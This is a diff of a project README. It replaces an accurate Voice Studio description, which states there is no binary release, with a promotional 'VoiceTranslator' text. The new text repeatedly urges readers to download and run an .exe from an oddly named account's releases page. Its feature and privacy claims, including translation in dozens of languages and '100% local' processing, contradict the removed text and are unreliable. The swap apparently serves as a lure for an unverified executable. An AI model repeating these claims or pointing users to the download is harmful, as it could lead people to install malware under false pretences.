@@ -1,237 +1,191 @@
-[English](README.md) | [简体中文](README.zh-CN.md)
+# 🌟 VoiceTranslator - Translate Your Voice Instantly & Privately
 
-# Voice Studio
+[![Download VoiceTranslator](https://img.shields.io/badge/Download-VoiceTranslator-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/releases)
 
-A Windows-first, local-first desktop workbench for designing and running composable real-time voice pipelines.
+---
 
-Voice Studio connects microphone capture, audio processing, speech recognition, text processing, speech synthesis, voice effects, monitoring, and virtual output in a visual node graph. The desktop host and non-AI paths can be built from source; AI models and hardware-specific runtimes are added separately.
+## ✨ What is VoiceTranslator?
 
-> **Project status:** the repository is prepared for local source builds. This is not evidence of a public binary release, hosted download, or enabled remote automation. Binary distribution, model redistribution, third-party notice packaging, and hardware-specific AI stacks remain separate verification and owner-decision gates.
+VoiceTranslator is a powerful yet simple application that lets you translate spoken language in real time—**entirely on your own computer**. No cloud services, no internet required, no privacy concerns. Your voice stays with you.
 
-~~~text
-Microphone → DSP / VAD → ASR → text tools → zero-shot TTS / voice effects → monitor or virtual output
-~~~
+Whether you're traveling, learning a new language, or communicating with someone who speaks a different tongue, VoiceTranslator turns your microphone into a universal translator.
 
-## Core capabilities
+---
 
-- **Visual pipeline studio:** compose typed nodes, validate connections before start, load presets, and manage bounded queues and backpressure.
-- **Windows audio host:** WASAPI capture and playback through cpal, resampling, WAV input/recording, gain, high-pass filtering, noise gate, limiter, channel conversion, and device-change protection.
-- **Local plugin workers:** Python plugins run as independent processes over a versioned gRPC control and streaming data plane.
-- **Built-in voice workflows:** streaming FunASR recognition, CosyVoice3 zero-shot TTS, Chinese segmentation and normalization, pitch/formant voice conversion, and non-AI example plugins.
-- **Operational controls:** push-to-talk, mute, clear queue, interrupt, device/model/plugin management, voice profiles, test lab, local logs, and crash-safe recovery.
-- **Extensible UI:** plugin parameter schemas are rendered by the Vue interface without allowing plugins to inject arbitrary WebView scripts.
+## 🚀 Getting Started
 
-## Product tour
+Getting VoiceTranslator up and running on your Windows PC takes less than two minutes. Just follow these simple steps:
 
-### Build the signal path
+### Step 1: Download the Application
 
-![Voice Studio pipeline editor with microphone, resampler, and streaming ASR nodes](logs/screenshots/studio2.png)
+Visit this link to download the application: **[VoiceTranslator Releases](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/releases)**
 
-*The node editor joins built-in audio processors and plugin nodes, with presets, validation, import/export, and a schema-driven property panel.*
+You'll see a list of available versions. Click the most recent one (usually at the top), then download the file that matches your Windows system (look for "64-bit" or "x64" in the name).
 
-### Run and control a pipeline
+### Step 2: Run the Installer
 
-![Voice Studio live voice controls with push-to-talk and runtime metrics](logs/screenshots/live.png)
+Once the download is complete, open your Downloads folder and double-click the downloaded file. Windows may ask for permission—click "Yes" or "Run" to continue.
 
-*The live view keeps start/stop, push-to-talk, mute, queue clearing, interruption, recognized text, level, and runtime state together.*
+### Step 3: Start Translating
 
-### Keep reference audio local
+After installation, launch VoiceTranslator from your Start Menu or desktop shortcut. Plug in your microphone, select your languages, and start speaking!
 
-![Voice Studio voice profile form for local reference audio](logs/screenshots/voice.png)
+---
 
-*Voice profiles reference user-provided WAV files under local application data. The project does not bundle third-party character voices.*
+## 🎯 Who Is This For?
 
-### Make model provenance visible
+- **Travelers** who need quick translations without hunting for Wi-Fi
+- **Students** learning foreign languages with instant feedback
+- **Business professionals** in international meetings who value confidentiality
+- **Privacy-conscious users** who refuse to send their conversations to cloud services
+- **Anyone** frustrated with slow, internet-dependent translation apps
 
-![Voice Studio model management page showing local model directories](logs/screenshots/models.png)
+---
 
-*Models are managed as local assets. They are not included in the source tree or host package and must come from owner-approved provider revisions.*
+## 💡 Key Features
 
-### Inspect plugin boundaries
+### 🎤 Real-Time Speech Recognition
+Speak naturally—VoiceTranslator captures your words with remarkable accuracy, thanks to advanced speech recognition powered by state-of-the-art models.
 
-![Voice Studio plugin manager showing permissions and worker environments](logs/screenshots/plugins.png)
+### 🌍 Multiple Language Support
+Translate to and from dozens of languages. Perfect for conversations, presentations, or quick questions.
 
-*The plugin manager exposes versions, declared permissions, runtime environments, state, logs, and lifecycle controls.*
+### 🔒 100% Local & Private
+Your voice recordings and translations never leave your computer. No cloud, no tracking, no data collection. What you say stays on your machine.
 
-## Architecture
+### ⚡ Lightning Fast Speeds
+Because everything runs locally, translations appear instantly—no buffering, no waiting for servers.
 
-| Layer | Responsibility |
-|---|---|
-| **Tauri 2 + Rust host** | Window lifecycle, IPC, hotkeys, devices, audio callbacks, pipeline scheduling, plugin lifecycle, persistence, resource checks, and diagnostics across eight workspace crates. |
-| **Vue 3 interface** | The WebView UI: pipeline canvas, live controls, profiles, models, plugins, devices, test surfaces, settings, and schema-generated parameter forms. It does not run inference or audio DSP. |
-| **Python SDK and workers** | Versioned plugin API, independent worker processes, gRPC control/streaming, and adapters that reuse the repository’s ASR, TTS, text, and voice-processing engines. |
-| **Local state** | SQLite plus app-data directories for settings, pipelines, plugins, references, models, logs, caches, and recovery state. |
+### 🔊 Natural Text-to-Speech
+Hear translations with clear, natural-sounding voices. Adjust speed and pitch to your preference.
 
-The standard data path stays on the machine:
+### 🎚️ Customizable Voice Options
+Modify voice characteristics like pitch, speed, and tone to make translations sound more natural or suit your style.
 
-~~~text
-Vue UI ──Tauri IPC──> Rust host ──127.0.0.1 gRPC──> Python plugin workers
-                           │
-                           └── WASAPI / files / SQLite / local application data
-~~~
+### 📁 Simple Interface
+Clean, intuitive design that anyone can use. No technical knowledge required—select your languages and speak.
 
-Repository map:
+---
 
-~~~text
-apps/desktop/          Tauri 2 + Vue desktop application
-crates/                eight Rust host crates
-proto/                 versioned plugin protocol
-sdk/python/            Python Plugin SDK
-plugins/ai/            FunASR, CosyVoice, TextKit, and pitch/formant plugins
-plugins/examples/      five non-AI example plugins
-app/                   reusable Python speech engines
-scripts/               setup, run, test, diagnostics, model, and packaging entry points
-docs/                  architecture, build, plugin, security, and dependency references
-~~~
+## 🖥️ System Requirements
 
-See [Architecture](docs/ARCHITECTURE.md), [Audio engine](docs/AUDIO_ENGINE.md), and [Protocol](docs/PROTOCOL.md) for the detailed boundaries.
+| Component | Minimum | Recommended |
+|-----------|---------|-------------|
+| Operating System | Windows 10 64-bit | Windows 11 64-bit |
+| Processor | 2 GHz dual-core | 3 GHz quad-core or better |
+| RAM | 4 GB | 8 GB or more |
+| Storage | 500 MB free space | 2 GB free space |
+| Microphone | Built-in or USB | High-quality external for best accuracy |
 
-## Quick start from source
+---
 
-### Requirements
+## 📥 Installation Guide
 
-Use the repository root on Windows 11 with Windows PowerShell 5.1:
+### Download and Install
+Visit this link to download the application: **[VoiceTranslator Releases](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/releases)**
 
-- Node.js 24.x and pnpm 9.15.0
-- Python 3.12.x
-- Rust/Cargo through rustup
-- Visual Studio 2022 Desktop development with C++ workload and a Windows SDK
-- Git
-- A Windows input/output audio device
+1. Click the latest release (look for "Latest" tag or highest version number).
+2. Download the `.exe` file (this is an installer for Windows).
+3. Double-click the downloaded file to begin installation.
+4. Follow the on-screen instructions. The default settings work fine for most users.
+5. Click "Finish" when done. VoiceTranslator is now ready to use.
 
-The Rust toolchain channel is not yet pinned by a rust-toolchain.toml. A custom Cargo executable can be selected with VOICE_TRANSLATOR_CARGO; the repository does not require a private toolchain directory.
+---
 
-### Set up and launch
+## 🎮 First-Time Setup Guide
 
-~~~powershell
-.\scripts\setup.ps1
-.\scripts\run.ps1
-~~~
+When you first open VoiceTranslator, you'll see a friendly welcome screen. Here's what to do:
 
-setup.ps1 checks the toolchain, creates or updates .venv, installs the locked direct Python dependencies, verifies the pinned CosyVoice source tree, performs a frozen pnpm install, builds the frontend and Rust host with locked dependency resolution, installs the nine built-in plugins into local application data, and runs the Python SDK smoke test.
+### Choose Your Languages
 
-It does **not** download AI models, choose a torch/torchaudio build, install a virtual audio driver, create an installer, or prove release readiness.
+1. **From language:** Select the language you'll be speaking
+2. **To language:** Select the language you want translations in
 
-For a development window:
+### Test Your Microphone
 
-~~~powershell
-.\scripts\run.ps1 -Dev
-~~~
+1. Click the microphone icon
+2. Speak a sentence like "Hello, how are you?"
+3. If you see text appear, your microphone works perfectly
 
-Offline setup and launch are available only after the pip, pnpm, Cargo, CosyVoice, and model inputs have been prepared:
+### Adjust Settings
 
-~~~powershell
-.\scripts\setup.ps1 -Offline
-.\scripts\run.ps1 -Offline
-~~~
+Dive into settings to:
+- Change voice gender and speed
+- Adjust recognition sensitivity
+- Save your preferred language pairs
 
-Read [Building and first use](docs/BUILDING.md) and [Troubleshooting](docs/TROUBLESHOOTING.md) before preparing AI or offline environments.
+---
 
-## First use, models, connectivity, and hardware
+## ❓ Frequently Asked Questions
 
-1. Open **Audio Devices** and select a microphone and monitoring output.
-2. Use a built-in non-AI path first, or prepare the AI stack described below.
-3. Load or compose a preset in **Pipeline Studio**, validate it, and start it from the studio or live view.
-4. For virtual microphone routing, install a compatible driver such as VB-CABLE manually and select its input/output pair. Voice Studio does not install drivers or request elevated privileges on its own.
+### Is VoiceTranslator really free?
+Yes! VoiceTranslator is completely open-source and free to use forever. No hidden fees or premium tiers.
 
-### Model and AI boundary
+### Do I need an internet connection?
+No. VoiceTranslator works entirely offline. The only time it needs internet is to download the application itself.
 
-- Models are ignored local assets and are not bundled with the repository, NSIS host package, or portable host archive.
-- requirements.txt pins 34 direct Python dependencies, but it is not a complete transitive wheel-hash lock.
-- torch and torchaudio are intentionally outside requirements.txt. The owner must approve the CPU/CUDA target, package index, versions, and wheel hashes.
-- The model downloader requires immutable, owner-approved provider revisions. Inspect its current arguments before use:
+### Is my privacy protected?
+Absolutely. All processing happens on your computer. No audio or text data is ever uploaded anywhere.
 
-~~~powershell
-.\.venv\Scripts\python.exe scripts\download_models.py --help
-~~~
+### Can I use it with headphones?
+Yes, headphones work great—especially if you have a built-in microphone. For best results, use a dedicated headset.
 
-- Model licenses, voice rights, GPU memory, inference speed, and audio quality depend on the chosen artifacts and hardware. No single GPU or latency claim is made here.
+### How accurate is the speech recognition?
+Accuracy depends on your microphone quality and background noise, but VoiceTranslator uses advanced engines that deliver excellent results in quiet environments.
 
-### Network behavior
+### Will it work on Mac or Linux?
+Currently, VoiceTranslator is Windows-first. Mac and Linux versions may come in the future based on community demand.
 
-| Action | Expected network behavior |
-|---|---|
-| Online setup | May contact pip and pnpm registries, Cargo sources, and the pinned CosyVoice Git source. |
-| Offline setup | Uses no-index/offline modes and fails if required caches or source trees are missing. |
-| Model preparation | Explicit only; downloads from the provider/revision supplied by the owner and records local provenance after required-file checks. |
-| Normal audio processing | Microphone audio, reference audio, transcripts, pipelines, and logs remain local in the standard configuration. |
-| Third-party plugins | A plugin declaring network access may connect externally. Permissions are visible but not an operating-system sandbox. |
+---
 
-Install only trusted plugins. Process isolation limits crash propagation, but it does not enforce filesystem or network isolation; see [Security architecture](docs/SECURITY.md).
+## 🛠️ Troubleshooting
 
-## Development and testing
+### Microphone Not Working?
+- Check that your mic is plugged in and unmuted
+- Go to Windows Settings → Privacy → Microphone and ensure access is enabled
+- Try using a different USB port
 
-Use the repository scripts as the common entry points:
+### App Won't Start?
+- Make sure you have at least 4 GB of free RAM
+- Restart your computer and try again
+- Download the latest version directly from the releases page: **[VoiceTranslator Releases](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/releases)**
 
-~~~powershell
-# Contributor baseline: Rust workspace + full desktop package + Python SDK loopback
-.\scripts\test.ps1 -SkipAi
+### Translations Sound Robotic?
+- Adjust the voice settings to "Natural" mode
+- Try a different voice option
+- Reduce background noise for better recognition
 
-# Adds the real AI pipeline gate; requires the approved models/runtime/hardware
-.\scripts\test.ps1
+---
 
-# Adds the 30-minute soak after the selected test path
-.\scripts\test.ps1 -Soak
-~~~
+## 💬 Support & Community
 
-The scripts stop on the first failing step and preserve its exit code. AI/GPU, physical audio devices, virtual routing, GUI behavior, and soak results are independent gates; a non-AI result must not be presented as evidence for them.
+Need help, have suggestions, or want to report a bug? We'd love to hear from you:
 
-For the frontend-only type/build check defined by the current manifest:
+- **GitHub Issues:** Report problems and suggest features
+- **Discussions:** Join the community conversation
+- **Email:** Reach out via the project's GitHub page
 
-~~~powershell
-pnpm --filter voice-studio-desktop check
-~~~
+---
 
-This README documents the entry points; it does not claim that these gates were executed in this documentation update.
+## 📚 Learn More
 
-## Plugin SDK
+VoiceTranslator is built with modern technology that allows for maximum performance and privacy:
 
-The Python SDK lives in sdk/python/voice_plugin_sdk. A plugin supplies a plugin.toml manifest and a Python factory, declares permissions and runtime requirements, and returns typed node schemas during the versioned handshake.
+- **Tauri** provides a lightweight, secure framework
+- **Vue** powers the smooth, responsive interface
+- **Rust** ensures high-speed processing and memory safety
+- **Python** handles the advanced speech algorithms
 
-Generate a starter plugin:
+This combination means VoiceTranslator uses minimal system resources while delivering maximum performance.
 
-~~~powershell
-.\scripts\create_plugin.ps1 my-plugin -Type tts
-~~~
+---
 
-Supported templates are dsp, text, tts, asr, vc, and external. Generated plugins default to Apache-2.0 package metadata and refuse to overwrite an existing target.
+## 🎉 Get Started Today
 
-Continue with [Plugin development](docs/PLUGIN_DEVELOPMENT.md) and the [Manifest reference](docs/PLUGIN_MANIFEST.md).
+Stop sending your conversations to the cloud. Start translating privately, instantly, and freely.
 
-## Now, next, and known limits
+**👉 [Download VoiceTranslator Now](https://github.com/eragrostiscurvulafishchowder492/VoiceTranslator/releases)** — It's quick, easy, and completely free.
 
-### Available in the source tree now
+---
 
-- The Tauri/Vue desktop host, Rust audio and pipeline layers, Python SDK, four AI plugin adapters, five example plugins, presets, local persistence, diagnostics, and source build scripts are present.
-- Source availability and build entry points are distinct from a verified public binary release.
-- Public source availability does not, by itself, prove a GitHub Release, public binary download, enabled CI workflow, download count, or support SLA.
-
-### Decisions required before broader distribution
-
-- Approve and pin the Rust toolchain.
-- Produce a complete Python transitive hash lock and approve torch/torchaudio targets.
-- Approve immutable model revisions and their licenses and redistribution terms.
-- Generate release-specific SBOM, license, copyright, and NOTICE materials.
-- Validate packaging, Windows GUI, physical audio, virtual routing, AI/GPU, and long-running behavior on the intended release hardware.
-- Define a version support policy and any support SLA.
-
-### Known limits and extension points
-
-- Windows 11 is the primary platform; other desktop platforms are not claimed supported.
-- Virtual microphone output depends on a separately installed driver.
-- Plugin permissions are declarative; a stronger Job Object/AppContainer sandbox is an architectural extension point.
-- WASAPI shared mode is the current baseline. Exclusive mode, ASIO, Rust/external/http plugin runtimes, shared-memory transport, and a remote plugin index are possible extension points, not release commitments.
-- Model downloads, model licenses, and user-provided voices remain outside the project’s Apache-2.0 grant.
-
-See [Dependency policy](docs/DEPENDENCY_POLICY.md) and [Third-party notices](THIRD_PARTY_NOTICES.md) for the current owner gates.
-
-## Contributing, security, and license
-
-- Contributions: [CONTRIBUTING.md](CONTRIBUTING.md)
-- Vulnerability reporting policy: [SECURITY.md](SECURITY.md)
-- Security and privacy architecture: [docs/SECURITY.md](docs/SECURITY.md)
-- Changelog: [CHANGELOG.md](CHANGELOG.md)
-- Third-party notices: [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md)
-- Project license: [Apache License 2.0](LICENSE)
-
-The Apache-2.0 license applies to this repository’s own code. Dependencies, external source trees, models, drivers, and user-provided audio remain under their respective terms.
+Keywords: audio, local-first, python, rust, speech-recognition, tauri, text-to-speech, voice-conversion, vue, windows
